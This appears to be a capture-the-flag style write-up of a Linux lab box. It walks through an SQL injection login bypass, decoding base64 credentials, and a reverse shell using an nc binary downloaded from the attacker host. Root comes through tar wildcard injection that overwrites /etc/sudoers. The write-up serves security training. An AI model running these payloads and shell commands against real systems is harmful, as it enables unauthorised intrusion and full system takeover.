#Linux #Gobuster #FeroxBuster #SQLi #LoginBypass #Base64 #CockpitUI #RestrictedShell #tar #GTFOBins #WildcardInjection

## Overview

Cockpit is a Linux box running an Apache web server on port 80 and Ubuntu's Cockpit management interface on port 9090. The HTTP landing page looks static, but FeroxBuster finds `login.php`, a SQL-injectable login form. Bypassing it dumps a password dashboard containing base64-encoded credentials. Those credentials log into the Cockpit web terminal as `james`. The Cockpit shell runs a restricted `nc` that cannot execute commands, but downloading a full `nc` binary bypasses that. `james` has a sudo rule for a specific `tar` command with a wildcard, enabling a classic tar wildcard injection that overwrites `/etc/sudoers` and grants unrestricted root access.

## Recon

### Nmap

```sh
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http    Apache httpd
9090/tcp open  zeus-admin
```

### Web Enumeration on Port 80

Gobuster finds standard CSS/JS directories but nothing exploitable:

```sh
gobuster dir -u http://192.168.176.10/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/css   (Status: 301)
/img   (Status: 301)
/js    (Status: 301)
```

FeroxBuster goes deeper and finds the login page:

```sh
200 GET  28l  63w  769c http://192.168.176.10/login.php
```

The page footer reveals a hostname for `/etc/hosts`: `blaze.offsec`. After adding it and reloading, the page identifies as a "blaze" login portal.

## Foothold

### SQL Injection, Auth Bypass

Default credentials fail. Entering a single quote `'` in the username field returns:

```sql
Error: You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near '%' AND password
like '%%'' at line 1
```

MySQL is running the query with `LIKE` comparisons, and the error leaks the query structure. Using a standard MySQL auth bypass payload:

```sql
'OR '' = '
```

> **Why this bypass works:** the injected `OR '' = ''` creates a condition that is always true, short-circuiting the password check. MySQL evaluates the full WHERE clause as true for every row, so the query returns the first user in the table regardless of the password provided.

The bypass opens the admin dashboard at `/password-dashboard.php`, which displays stored credentials:

```
Username   Password
james      Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron    dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```

Both passwords are base64-encoded (not hashed):

```sh
echo 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=' | base64 -d
‹redacted›

echo 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy' | base64 -d
‹redacted›
```

Giving credentials:

```
james : ‹redacted›
cameron : ‹redacted›
```

### Cockpit Web Terminal

Port 9090 is Ubuntu Cockpit, a browser-based server management interface. `james`'s credentials authenticate successfully. Cockpit provides a web terminal running as `james`.

The installed `nc` binary is restricted:

```sh
james@blaze:~$ nc -e
nc: invalid option -- 'e'
```

No `-e` flag means no direct reverse shell. But `wget` is unrestricted, so a full-featured `nc` binary can be pulled from Kali:

```sh
james@blaze:~$ wget http://192.168.45.244/nc
james@blaze:~$ chmod +x nc
james@blaze:~$ ./nc 192.168.45.244 9090 -e /bin/bash
```

```sh
nc -lvnp 9090
connect to [192.168.45.244] from (UNKNOWN) [192.168.176.10] 52258

whoami
james
```

Shell upgrade:

```sh
script /dev/null -c /bin/bash
james@blaze:~$
```

## Privilege Escalation

### tar Wildcard Injection

`sudo -l` shows a constrained but exploitable rule:

```sh
User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

The trailing `*` is the vulnerability. When `tar` expands a wildcard, it treats filenames as command arguments. GTFOBins documents the technique:

> **How tar wildcard injection works:** `tar` processes each file in the current directory as an argument. If a filename looks like a `tar` option (e.g., `--checkpoint-action=exec=cmd`), `tar` interprets it as a flag rather than a filename. By creating specially named files, an attacker injects arbitrary tar options into the command the admin intended to run, causing code execution without touching the tar binary itself.

Create the injection files in `/tmp`:

```sh
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
```

Create `payload.sh` on Kali and transfer it via wget:

```sh
# payload.sh contents:
echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

```sh
wget http://192.168.45.244/payload.sh
chmod +x payload.sh
```

Run the sudo tar command from `/tmp`:

```sh
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

`tar` hits the checkpoint file, executes `payload.sh`, and overwrites `/etc/sudoers`. Confirming:

```sh
james@blaze:/tmp$ sudo -l
User james may run the following commands on blaze:
    (root) NOPASSWD: ALL
```

## Root

```sh
james@blaze:/tmp$ sudo /bin/bash
root@blaze:/tmp# whoami
root
```

## Takeaways

- **SQL error messages are free reconnaissance.** The leaked query structure told exactly which bypass to use without any fuzzing.
- **Base64 is encoding, not encryption.** Credentials stored as base64 in a database are effectively plaintext, one command to decode.
- **Cockpit's web terminal is a real shell.** Browser-based management UIs are high-value targets; gaining credentials to one is functionally equivalent to SSH access.
- **Wildcard injection in sudo commands is a reliable privesc.** Any sudo rule with a trailing `*` in a user-writable directory is exploitable via specially crafted filenames, regardless of what command is being run.
